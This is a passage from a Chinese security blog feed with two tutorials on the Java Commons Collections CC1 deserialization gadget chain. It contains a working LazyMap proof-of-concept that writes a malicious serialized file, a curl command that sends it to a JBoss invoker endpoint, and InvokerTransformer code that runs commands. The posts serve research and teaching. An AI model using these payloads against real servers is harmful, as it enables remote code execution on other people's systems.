class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">tc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(ts);</span><br><span class="line"></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), tc);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建第一个AnnotationInvocationHandler实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Proxy.newProxyInstance()方法创建代理对象proxyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二次创建AnnotationInvocationHandler实例来对proxyMap进行包装</span></span><br><span class="line">        handler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc1-lazymap.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(handler);</span><br><span class="line">        outputStream.close();</span><br><span class="line"><span class="comment">//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;cc1-lazymap.ser&quot;));</span></span><br><span class="line"><span class="comment">//        inputStream.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向一个存在反序列化漏洞且JDK版本小于8u71的Jboss环境发送如上生成的恶意序列化数据，成功弹出计算器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&quot;</span> --data-binary <span class="string">&quot;@cc1-lazymap.ser&quot;</span> http://localhost:8080/invoker/readonly</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc1-lazymap/1.png"></p><p>如下是完整Gadget调用链。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map(Proxy).entrySet()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc1-lazymap/r.png"></p><h2 id="0x06-Debug导致的小问题"><a href="#0x06-Debug导致的小问题" class="headerlink" title="0x06 Debug导致的小问题"></a>0x06 Debug导致的小问题</h2><p>如上POC在调试时，在进行序列化时就会弹出计算器，有时候甚至会弹出两个计算器，这些情况在直接运行的情况下反倒不会出现。这其实是由于在本地调试代码时，调试器会调用一些toString等方法，这样便触发了invoke的调用，从而导致命令执行。有一种非常简单的方式来避免这种行为，在IDEA中关闭如下两项即可。</p><p><img src="/img/post/java-deserialization-cc1-lazymap/2.png"></p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><ul><li><a href="https://0xf4n9x.github.io/java-deserialization-vulnerability-principle.html">https://0xf4n9x.github.io/java-deserialization-vulnerability-principle.html</a></li><li><a href="https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap.html">https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap.html</a></li><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></li><li><a href="https://mp.weixin.qq.com/s/d5UvL065Lc1WXhsRmb92qw">https://mp.weixin.qq.com/s/d5UvL065Lc1WXhsRmb92qw</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> deserialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化漏洞之TransformedMap版CC1链</title>
      <link href="/java-deserialization-cc1-transformedmap.html"/>
      <url>/java-deserialization-cc1-transformedmap.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-CommonsCollections1%E9%93%BE%E7%AE%80%E4%BB%8B">0x00 CommonsCollections1链简介</a><ul><li><a href="#Apache-Commons-Collections%E4%BB%8B%E7%BB%8D">Apache Commons Collections介绍</a></li><li><a href="#CommonsCollections1%E9%93%BE%E7%9A%84%E4%B8%A4%E7%A7%8D%E4%B8%8D%E5%90%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">CommonsCollections1链的两种不同利用方式</a></li><li><a href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">影响版本</a></li></ul></li><li><a href="#0x01-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">0x01 准备工作</a><ul><li><a href="#Java%E7%89%88%E6%9C%AC%E7%9A%84%E9%80%89%E6%8B%A9">Java版本的选择</a></li><li><a href="#%E6%B7%BB%E5%8A%A0sun%E6%BA%90%E7%A0%81">添加sun源码</a></li></ul></li><li><a href="#0x02-Transformer%E6%8E%A5%E5%8F%A3%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%AE%9E%E7%8E%B0%E7%B1%BB">0x02 Transformer接口及相关实现类</a><ul><li><a href="#Transformer%E6%8E%A5%E5%8F%A3">Transformer接口</a></li><li><a href="#InvokerTransformer">InvokerTransformer</a></li><li><a href="#ConstantTransformer">ConstantTransformer</a></li><li><a href="#ChainedTransformer">ChainedTransformer</a></li></ul></li><li><a href="#0x03-TransformedMap%E4%B8%AD%E9%97%B4%E9%93%BE">0x03 TransformedMap中间链</a></li><li><a href="#0x04-AnnotationInvocationHandler-Kick-off%E7%B1%BB">0x04 AnnotationInvocationHandler Kick-off类</a><ul><li><a href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95">构造方法</a></li><li><a href="#readObject%E6%96%B9%E6%B3%95">readObject方法</a></li><li><a href="#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8">反射调用</a></li></ul></li><li><a href="#0x05-%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81">0x05 利用代码及漏洞验证</a></li><li><a href="#0x06-%E5%8F%82%E8%80%83">0x06 参考</a></li></ul><h2 id="0x00-CommonsCollections1链简介"><a href="#0x00-CommonsCollections1链简介" class="headerlink" title="0x00 CommonsCollections1链简介"></a>0x00 CommonsCollections1链简介</h2><h3 id="Apache-Commons-Collections介绍"><a href="#Apache-Commons-Collections介绍" class="headerlink" title="Apache Commons Collections介绍"></a>Apache Commons Collections介绍</h3><p>Apache Commons Collections是Apache Commons项目中的一个子项目，它提供了一套丰富的Java集合类和实用工具，用于增强和扩展 Java 标准库中的集合框架。这个项目旨在填补标准Java集合框架中的一些缺失，并提供更多功能强大的集合类和工具，以便Java开发者能够更轻松地处理各种集合操作。</p><h3 id="CommonsCollections1链的两种不同利用方式"><a href="#CommonsCollections1链的两种不同利用方式" class="headerlink" title="CommonsCollections1链的两种不同利用方式"></a>CommonsCollections1链的两种不同利用方式</h3><p>2015年1月，加州AppSec安全会议上，Chris Frohoff和Gabe Lawrence发表《Marshalling Pickles》主题演讲，在演讲中就CommonsCollections1完整调用链做出了演示，其中所用到的中间Gadget链是<code>LazyMap</code>类，这在随后发布的知名反序列化工具Ysoserial中所包含的CommonsCollections1链（以下简称CC1链）也同样如此。</p><p>2015年10月28日，Matthias Kaiser首次在他的《Exploiting Deserialization Vulnerabilities in Java》演讲中提到了另一种使用<code>TransformedMap</code>类作为中间Gadget链的CC1链利用方式，这种利用方式相比前者更加地简单。</p><p>2015年11月6日，breenmachine发表了一篇利用Ysoserial工具中的CC1链攻击WebLogic、WebSphere、JBoss、Jenkins等知名应用程序的文章，原因在于这些应用中大量使用了Commons Collections组件。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>如上提到的俩种不同的利用方式（<code>LazyMap</code>&#x2F;<code>TransformedMap</code>），不管是哪种，所受影响的范围都是相同的。首先JDK版本要求小于8u71，其次对于Commons Collections的版本要求在3.2.2以下并且3.0以上，可以直接通过Maven引入依赖，只要版本号小于等于3.2.1且大于等于3.1即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><h3 id="Java版本的选择"><a href="#Java版本的选择" class="headerlink" title="Java版本的选择"></a>Java版本的选择</h3><p>在Java 8u71这个版本中，有对<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>方法进行修改，从原来的<code>Map</code>对象变为<code>LinkedHashMap</code>对象，这样就会造成CC1链中构造的<code>Map</code>无法进行put或set，从而导致该链的构造失败。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reference: https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">-        s.defaultReadObject();</span><br><span class="line">+        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">+</span><br><span class="line">+        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">+        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; t = (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">+        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">+        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"> </span><br><span class="line">         <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">-            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">+            annotationType = AnnotationType.getInstance(t);</span><br><span class="line">         &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">             <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">+        <span class="comment">// consistent with runtime Map type</span></span><br><span class="line">+        Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">         <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">-        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">+        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">             <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">+            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">             <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">-                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">+                value = memberValue.getValue();</span><br><span class="line">                 <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                       value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">-                    memberValue.setValue(</span><br><span class="line">-                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">+                    value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                             value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">-                                annotationType.members().get(name)));</span><br><span class="line">+                                annotationType.members().get(name));</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">+            mv.put(name, value);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        UnsafeAccessor.setType(<span class="built_in">this</span>, t);</span><br><span class="line">+        UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);</span><br><span class="line">+    &#125;</span><br></pre></td></tr></table></figure><p>所以对于CC1链的调试、研究学习，所需的Java版本必须小于8u71版本，8u66版本就是一个临界的选择。但在调试过程中可以发现，JDK中关于sun包都是反编译的class文件，这会影响到代码的阅读。</p><p><img src="/img/post/java-deserialization-cc1-transformedmap/0.png"></p><h3 id="添加sun源码"><a href="#添加sun源码" class="headerlink" title="添加sun源码"></a>添加sun源码</h3><p>JDK在f8a528d0379d这个commit中对<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>方法进行了修改。</p><p><img src="/img/post/java-deserialization-cc1-transformedmap/1.png"></p><p>那便下载这个commit的parents的zip，下载链接<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a>。</p><p><img src="/img/post/java-deserialization-cc1-transformedmap/2.png"></p><p>文件哈希如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5 (jdk-af660750b2f4.zip) = 696c4e77c75dd620a20d560d4e30c551</span><br></pre></td></tr></table></figure><p>下载jdk-af660750b2f4.zip文件至本地后，先将本地JDK 8u66安装目录中的src.zip解压，解压后的src文件夹同样放置在JDK 8u66安装目录中。最后将jdk-af660750b2f4.zip中<code>src/share/classes</code>下的sun文件夹复制到JDK 8u66安装目录下的src目录中。</p><p><img src="/img/post/java-deserialization-cc1-transformedmap/3.png"></p><p>再回到IDEA中，在IDEA的项目结构中添加如上目录作为一个源路径。</p><p><img src="/img/post/java-deserialization-cc1-transformedmap/4.png"></p><p>再次进入到<code>AnnotationInvocationHandler</code>这个类，可以发现已经变成java文件了。</p><p><img src="/img/post/java-deserialization-cc1-transformedmap/5.png"></p><h2 id="0x02-Transformer接口及相关实现类"><a href="#0x02-Transformer接口及相关实现类" class="headerlink" title="0x02 Transformer接口及相关实现类"></a>0x02 Transformer接口及相关实现类</h2><h3 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h3><p><code>org.apache.commons.collections.Transformer</code>是Commons Collections中的一个接口类，用于定义一个将一个对象转换为另一个对象的函数接口，该接口提供了一个待实现的<code>transform</code>方法执行转换操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将输入对象（保持不变）转换成某个输出对象。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input：要转换的对象，应保持不变</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>：一个转换后的对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Transformer</code>接口有几个重要的实现类，如<code>InvokerTransformer</code>、<code>ConstantTransformer</code>、<code>ChainedTransformer</code>，如下将逐一介绍这些实现类及<code>transform</code>实现方法。</p><p><img src="/img/post/java-deserialization-cc1-transformedmap/6.png"></p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>这个类是CC1链中的关键sink类，它是<code>Transformer</code>接口的一个实现类，且实现了<code>Serializable</code>，这意味着可以参与序列化。该类代码如下，已经省去多余无关的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.FunctorException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过反射创建新对象实例的Transformer实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 序列版本 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** 要调用的方法名 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="comment">/** 反射参数类型数组 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="comment">/** 反射参数数组 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodName  要调用的方法名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> paramTypes  构造方法参数类型，而非克隆的</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args  构造方法参数，而非克隆的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过调用输入的方法将输入转换为结果</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  要转换的输入对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 转换后的结果，如果输入为null，则为null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取输入的类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="comment">// 获取指定参数名及参数类型的方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="comment">// 通过反射调用method方法</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在其中，<code>InvokerTransformer</code>方法接收三个参数，分别是要调用的方法名、方法参数类型、以及方法参数值，<code>transform</code>方法则能够根据接收的类对象使用反射进行动态调用，这便是造成任意命令执行的根本原因。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SinkTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator.app&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line">        t.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在如上示例代码中，首先使用<code>InvokerTransformer</code>创建了一个Transformer t，指定了要调用的方法名为<code>&quot;exec&quot;</code>，方法参数类型为<code>String.class</code>，方法参数值为<code>&#123;&quot;open -a Calculator.app&quot;&#125;</code>。随后将<code>Runtime.getRuntime()</code>作为参数传递给了t的<code>transform()</code>方法，这里将会调用<code>Runtime.getRuntime().exec(&quot;open -a Calculator.app&quot;)</code>方法 ，这样便能够达到命令的执行。</p><p><img src="/img/post/java-deserialization-cc1-transformedmap/7.png"></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><code>ConstantTransformer</code>同样是<code>Transformer</code>接口的一个实现类，也同样实现了<code>Serializable</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> 